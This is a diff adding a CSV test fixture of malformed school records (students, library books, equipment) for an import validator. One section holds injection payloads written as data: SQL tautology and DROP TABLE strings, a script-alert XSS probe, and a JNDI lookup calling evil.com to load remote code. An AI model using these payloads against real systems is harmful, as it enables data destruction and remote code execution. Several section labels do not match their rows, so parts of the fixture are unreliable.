@@ -1,0 +1,158 @@
+# This file contains edge cases and error scenarios for testing
+# Student records with various issues
+name,grade_level,section,student_id,email,phone
+,Grade 8,A,EDGE001,,555-0001  # Missing name
+Smith,,B,EDGE002,john.smith@email.com,555-0002  # Missing grade level
+Johnson,9,,EDGE003,mary.johnson@email.com,555-0003  # Missing section
+Williams,Robert,G10,,robert.williams@email.com,555-0004  # Missing student_id
+Brown,Alice,11,D,INVALID EMAIL,555-0005  # Invalid email
+Davis,Emily,Grade 12,E,emily.davis@email.com,INVALID PHONE  # Invalid phone
+Miller,Michael,8,F,EDGE006,michael.miller@email.com,555-0006
+# Invalid grade levels
+Wilson,Sarah,Grade 13,G,EDGE007,sarah.wilson@email.com,555-0007  # Grade too high
+Moore,David,0,H,EDGE008,david.moore@email.com,555-0008  # Grade too low
+Taylor,Lisa,-1,I,EDGE009,lisa.taylor@email.com,555-0009  # Negative grade
+Anderson,James,Grade,K,J,EDGE010,james.anderson@email.com,555-0010  # Non-numeric grade
+# Invalid name formats
+Thomas, Patricia,9,K,EDGE011,patricia.thomas@email.com,555-0011  # Single name only
+White,Nancy,Grade 10,L,John,INVALID ID,555-0012  # Student ID as name
+Harris,Daniel,11,M,Daniel Harris,EDGE013,daniel.harris@email.com,555-0013  # No comma separator
+Martin,Linda,Grade 12,N,Smith, Robert,EDGE014,linda.martin@email.com,555-0014  # Extra comma
+Garcia,Paul,8,O,P,EDGE015,paul.garcia@email.com,555-0015  # Missing section
+# Special characters in names
+Lee,Robert,9,Q,O'Connor,EDGE016,robert.lee@email.com,555-0016  # Apostrophe in name
+Walker,Nancy,G10,R,Smith-Jones,EDGE017,nancy.walker@email.com,555-0017  # Hyphenated last name
+Hall,Paul,11,S,De La Cruz,EDGE018,paul.hall@email.com,555-0018  # Multi-word last name
+Allen,Barbara,Grade 12,T,O'Neill,EDGE019,barbara.allen@email.com,555-0019  # Apostrophe in last name
+Young,Mark,8,U,Van der Berg,EDGE020,mark.young@email.com,555-0020  # Dutch prefix
+# Duplicate student IDs
+King,Patricia,9,V,EDGE001,patricia.king@email.com,555-0021  # Duplicate ID
+Scott,Linda,G10,W,EDGE001,linda.scott@email.com,555-0022  # Duplicate ID
+Green,Ronald,11,X,EDGE003,ronald.green@email.com,555-0023  # Duplicate ID
+Baker,Carol,Grade 12,Y,EDGE004,carol.baker@email.com,555-0024  # Duplicate ID
+# Very long fields
+Adams,Daniel,8,ZZ,VERYLONGSTUDENTIDTHATEXCEEDSNORMALLIMITS12345678901234567890,daniel.adams@email.com,555-0025
+Nelson,Elizabeth,9,AA,EDGE026,very.long.email.address.that.exceeds.normal.limits.for.testing.purposes@example.com,555-0026
+Carter,Frank,G10,BB,EDGE027,frank.carter@email.com,555-VERYLONGPHONENUMBERTHATEXCEEDSNORMALLIMITS12345678901234567890
+Mitchell,Helen,11,CC,EDGE028,helen.mitchell@email.com,555-0028
+# Empty and null-like values
+Perez,Joseph,Grade 12,DD,,joseph.perez@email.com,555-0029  # Empty student_id
+Roberts,Cynthia,9,EE,EDGE030,,555-0030  # Empty email
+Turner,Ronald,G10,FF,EDGE031,ronald.turner@email.com,  # Empty phone
+Phillips,Angela,11,GG,EDGE032,angela.phillips@email.com,NULL  # NULL-like phone
+Campbell,Brian,Grade 12,HH,EDGE033,brian.campbell@email.com,null  # null-like phone
+# Book records with edge cases
+# Note: This would be in a separate file for books, but included here for demonstration
+# accession_no,isbn,title,author,edition,volume,pages,sourceOfFund,costPrice,publisher,year,remarks
+,978-3-16-148410-0,Missing Accession,John Smith,1,1,500,School Fund,$45.99,Tech Publishers,2024,
+INVALID ISBN-001,INVALID-ISBN,Invalid ISBN Book,Mary Johnson,2,1,600,Library Fund,$55.50,Edu Press,2023,
+BOOK-001,,Missing ISBN,Robert Williams,3,1,450,Donation,$35.00,Science Books,2024,
+ACC004,978-3-16-148410-3,,Alice Brown,1,2,400,Budget,$25.75,Academic Press,2022,Missing title
+ACC005,978-3-16-148410-4,Missing Author,,1,1,500,School Fund,$40.00,History Press,2023,No author
+ACC006,978-3-16-148410-5,Invalid Edition,Emily Davis,invalid,1,550,Grant,$65.25,Bio Publishers,2024,
+ACC007,978-3-16-148410-6,Invalid Volume,Michael Miller,2,invalid,450,Library Fund,$30.50,Lit Books,2024,
+ACC008,978-3-16-148410-7,Invalid Pages,Sarah Wilson,3,1,invalid,Donation,$28.00,Geo Publishers,2022,
+ACC009,978-3-16-148410-8,Invalid Price,David Moore,1,1,400,Budget,$35.50,Math Press,2023,
+ACC010,978-3-16-148410-9,Invalid Year,Lisa Taylor,2,1,380,Grant,invalid year,Tech Books,2024,
+# Equipment records with edge cases
+# equipment_id,name,type,location,max_time_minutes,requiresSupervision,description
+,EQ001,Laptop Computer,computer,Room 101,120,yes,Missing equipment_id
+LAB-002,,Projector,projector,Room 102,90,yes,Missing name
+COMP-003,Desktop Computer,,Lab 201,180,yes,Missing type
+12345,Printer,,Library,60,no,Missing type again
+ACC004,Scanner,scanner,,45,no,Missing location
+ACC005,Tablet,tablet,Room 103,,no,Missing max_time
+ACC006,Smart Board,interactive_board,Room 104,120,,Missing supervision flag
+ACC007,Digital Camera,camera,Art Room,120,invalid supervision,Invalid supervision value
+# Mixed data types in numeric fields
+NUMERIC-001,Test Record 1,Grade 9,A,NUM001,test1@example.com,555-0001
+NUMERIC-002,Test Record 2,nine,B,NUM002,test2@example.com,555-0002
+NUMERIC-003,Test Record 3,9.5,C,NUM003,test3@example.com,555-0003
+NUMERIC-004,Test Record 4,$9,D,NUM004,test4@example.com,555-0004
+NUMERIC-005,Test Record 5,nine dollars,E,NUM005,test5@example.com,555-0005
+# Date format variations
+DATE-001,Test Record 1,01/15/2024,A,DATE001,test1@example.com,555-0001
+DATE-002,Test Record 2,15/01/2024,B,DATE002,test2@example.com,555-0002
+DATE-003,Test Record 3,2024-01-15,C,DATE003,test3@example.com,555-0003
+DATE-004,Test Record 4,Jan 15,2024,D,DATE004,test4@example.com,555-0004
+DATE-005,Test Record 5,15-Jan-2024,E,DATE005,test5@example.com,555-0005
+DATE-006,Test Record 6,2024,F,DATE006,test6@example.com,555-0006
+# Boolean format variations
+BOOL-001,Test Record 1,9,A,BOOL001,test1@example.com,555-0001
+BOOL-002,Test Record 2,9,B,BOOL002,test2@example.com,555-0002
+BOOL-003,Test Record 3,9,C,BOOL003,test3@example.com,555-0003
+BOOL-004,Test Record 4,9,D,BOOL004,test4@example.com,555-0004
+BOOL-005,Test Record 5,9,E,BOOL005,test5@example.com,555-0005
+BOOL-006,Test Record 6,9,F,BOOL006,test6@example.com,555-0006
+# Phone number format variations
+PHONE-001,Test Record 1,9,A,PHONE001,test1@example.com,(555) 000-0001
+PHONE-002,Test Record 2,9,B,PHONE002,test2@example.com,555.000.0002
+PHONE-003,Test Record 3,9,C,PHONE003,test3@example.com,555 000 0003
+PHONE-004,Test Record 4,9,D,PHONE004,test4@example.com,+1-555-000-0004
+PHONE-005,Test Record 5,9,E,PHONE005,test5@example.com,5550000005
+PHONE-006,Test Record 6,9,F,PHONE006,test6@example.com,invalid phone format
+# Email format variations
+EMAIL-001,Test Record 1,9,A,EMAIL001,test.user@domain.com,555-0001
+EMAIL-002,Test Record 2,9,B,EMAIL002,user+tag@sub.domain.com,555-0002
+EMAIL-003,Test Record 3,9,C,EMAIL003,user.name@domain.co.uk,555-0003
+EMAIL-004,Test Record 4,9,D,EMAIL004,user@localhost,555-0004
+EMAIL-005,Test Record 5,9,E,EMAIL005,invalid email format,555-0005
+EMAIL-006,Test Record 6,9,F,EMAIL006,@missing-local.com,555-0006
+EMAIL-007,Test Record 7,9,G,EMAIL007,missing-domain@,555-0007
+# Special characters in text fields
+SPECIAL-001,O'Connor,John,9,A,SPEC001,john.oconnor@email.com,555-0001
+SPECIAL-002,Smith-Jones,Mary,G10,B,SPEC002,mary.smith-jones@email.com,555-0002
+SPECIAL-003,De La Cruz,Robert,11,C,SPEC003,robert.delacruz@email.com,555-0003
+SPECIAL-004,Van der Berg,Alice,Grade 12,D,SPEC004,alice.vanderberg@email.com,555-0004
+SPECIAL-005,O'Neil-D'Arcy,Emily,8,E,SPEC005,emerald.oneil@email.com,555-0005
+SPECIAL-006,Müller,Hans,9,F,SPEC006,hans.muller@email.com,555-0006
+SPECIAL-007,José García,10,G,SPEC007,jose.garcia@email.com,555-0007
+SPECIAL-008,Борис Петров,11,H,SPEC008,boris.petrov@email.com,555-0008
+SPECIAL-009,李明,Grade 9,I,SPEC009,li.ming@email.com,555-0009
+SPECIAL-010,田中太郎,10,J,SPEC010,toru.tanaka@email.com,555-0010
+# Whitespace issues
+WHITESPACE-001,  Smith  ,  John  ,  9  ,  A  ,  WS001  ,  john.smith@email.com  ,  555-0001  
+WHITESPACE-002,"Johnson, Mary","Grade 10","B","WS002","mary.johnson@email.com","555-0002"
+WHITESPACE-003,	Williams	Robert	G10	C	WS003	robert.williams@email.com	555-0003	# Tab-separated
+# Unicode and special characters
+UNICODE-001,👤 Test User,9,A,UNI001,test.user@email.com,555-0001
+UNICODE-002,Test ✓ Record,G10,B,UNI002,test.record@email.com,555-0002
+UNICODE-003,Test ™ Symbol,11,C,UNI003,test.symbol@email.com,555-0003
+UNICODE-004,Test © Copyright,Grade 12,D,UNI004,test.copyright@email.com,555-0004
+UNICODE-005,Test ® Registered,8,E,UNI005,test.registered@email.com,555-0005
+# SQL injection attempts (should be sanitized)
+SQL-001,' OR '1'='1,9,A,SQL001,test.user@email.com,555-0001
+SQL-002,; DROP TABLE students; --,G10,B,SQL002,test.user@email.com,555-0002
+SQL-003,<script>alert('XSS')</script>,11,C,SQL003,test.user@email.com,555-0003
+SQL-004,${jndi:ldap://evil.com/a},Grade 12,D,SQL004,test.user@email.com,555-0004
+# Extremely long values
+LONG-001,This is an extremely long name that exceeds normal database field limits and should be truncated or rejected during import processing to prevent database errors,9,A,LONG001,test.user@email.com,555-0001
+LONG-002,Smith,John,9,B,VERYLONGSTUDENTID12345678901234567890123456789012345678901234567890,john.smith@verylongemailaddressdomainnamethatexceedslimitsandshouldbetruncatedorrejected.com,555-0002
+LONG-003,Johnson,Mary,G10,C,LONG003,mary.johnson@email.com,555-VERYLONGPHONENUMBER1234567890123456789012345678901234567890
+# Mixed case and formatting
+CASE-001,sMITH, jOHN,9,a,CASE001,john.smith@email.com,555-0001
+CASE-002,JOHNSON, MARY,GRADE 10,b,CASE002,mary.johnson@email.com,555-0002
+CASE-003,williams, robert,11,c,CASE003,robert.williams@email.com,555-0003
+CASE-004,BROWN, alice,GRADE 12,d,CASE004,alice.brown@email.com,555-0004
+CASE-005,DAVIS, emily,8,e,CASE005,emily.davis@email.com,555-0005
+# Numeric edge cases
+NUMEDGE-001,Test Record,9,A,NUMEDGE001,test.user@email.com,0
+NUMEDGE-002,Test Record,G10,B,NUMEDGE002,test.user@email.com,-1
+NUMEDGE-003,Test Record,11,C,NUMEDGE003,test.user@email.com,999999999
+NUMEDGE-004,Test Record,Grade 12,D,NUMEDGE004,test.user@email.com,3.14159
+NUMEDGE-005,Test Record,8,E,NUMEDGE005,test.user@email.com,1.5e10
+NUMEDGE-006,Test Record,9,F,NUMEDGE006,test.user@email.com,NaN
+NUMEDGE-007,Test Record,G10,G,NUMEDGE007,test.user@email.com,Infinity
+# Date edge cases
+DATEEDGE-001,Test Record,9,A,DATEEDGE001,test.user@email.com,555-0001
+DATEEDGE-002,Test Record,G10,B,DATEEDGE002,test.user@email.com,555-0002
+DATEEDGE-003,Test Record,11,C,DATEEDGE003,test.user@email.com,555-0003
+DATEEDGE-004,Test Record,Grade 12,D,DATEEDGE004,test.user@email.com,555-0004
+DATEEDGE-005,Test Record,8,E,DATEEDGE005,test.user@email.com,555-0005
+DATEEDGE-006,Test Record,9,F,DATEEDGE006,test.user@email.com,555-0006
+DATEEDGE-007,Test Record,G10,G,DATEEDGE007,test.user@email.com,555-0007
+DATEEDGE-008,Test Record,11,H,DATEEDGE008,test.user@email.com,555-0008
+DATEEDGE-009,Test Record,Grade 12,I,DATEEDGE009,test.user@email.com,555-0009
+DATEEDGE-010,Test Record,8,J,DATEEDGE010,test.user@email.com,555-0010
+# Final test record - should be valid
+FINAL-001,Test User,9,A,FINAL001,test.user@email.com,555-0001
